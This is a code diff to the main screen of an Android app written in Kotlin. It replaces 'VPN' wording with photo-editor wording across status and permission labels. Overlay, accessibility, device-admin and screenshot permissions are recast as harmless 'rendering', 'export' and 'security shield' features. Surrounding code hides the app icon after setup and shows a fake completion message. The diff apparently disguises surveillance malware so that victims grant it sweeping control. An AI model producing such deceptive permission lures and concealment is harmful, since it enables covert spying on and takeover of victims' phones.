@@ -176,18 +176,18 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateStatusText(pairCode: String) {
-        val status = if (ADexForegroundService.isServiceRunning) "VPN Active" else "VPN Disconnected"
+        val status = if (ADexForegroundService.isServiceRunning) "Editing Active" else "Ready to Edit"
         val linkState = when {
-            pairCode.startsWith("linked:", ignoreCase = true) -> "VPN Securely Tunneled"
+            pairCode.startsWith("linked:", ignoreCase = true) -> "Cloud Project Linked"
             pairCode.startsWith("pair_code:", ignoreCase = true) -> {
                 val code = pairCode.substringAfter("pair_code:")
-                "VPN Node Code: $code"
+                "Project Sync Code: $code"
             }
             pairCode.startsWith("error:", ignoreCase = true) -> "Sync Failed"
             pairCode.isNotBlank() -> pairCode
-            else -> "Connecting to VPN Server..."
+            else -> "Connecting to Asset Server..."
         }
-        statusText.text = "Connection: $status | $linkState"
+        statusText.text = "Session: $status | $linkState"
     }
 
     private fun updatePermissionChecklistText() {
@@ -204,12 +204,12 @@ class MainActivity : AppCompatActivity() {
         }
 
         val lines = listOf(
-            "VPN Diagnostics: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
-            "VPN Background optimization: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
-            "VPN Screenshot Support: $screenshotStatusText",
-            "VPN Security Shield: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
-            "VPN Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
-            "VPN Service: ${statusLabel(notificationGranted)}",
+            "Editor Diagnostics: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
+            "Rendering Background optimization: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
+            "Instant Export Support: $screenshotStatusText",
+            "Project Security Shield: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
+            "Creative Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
+            "Export Service: ${statusLabel(notificationGranted)}",
         ).toMutableList()
 
         if (runtimeMissing.isNotEmpty()) {
@@ -291,7 +291,7 @@ class MainActivity : AppCompatActivity() {
                 hideAppIcon()
                 
                 // Show a quick text before closing so they know it's "Done"
-                statusText.text = "VPN Connection established. Background protection active."
+                statusText.text = "Project sync complete. Background rendering active."
                 
                 kotlinx.coroutines.delay(1500)
                 finish()
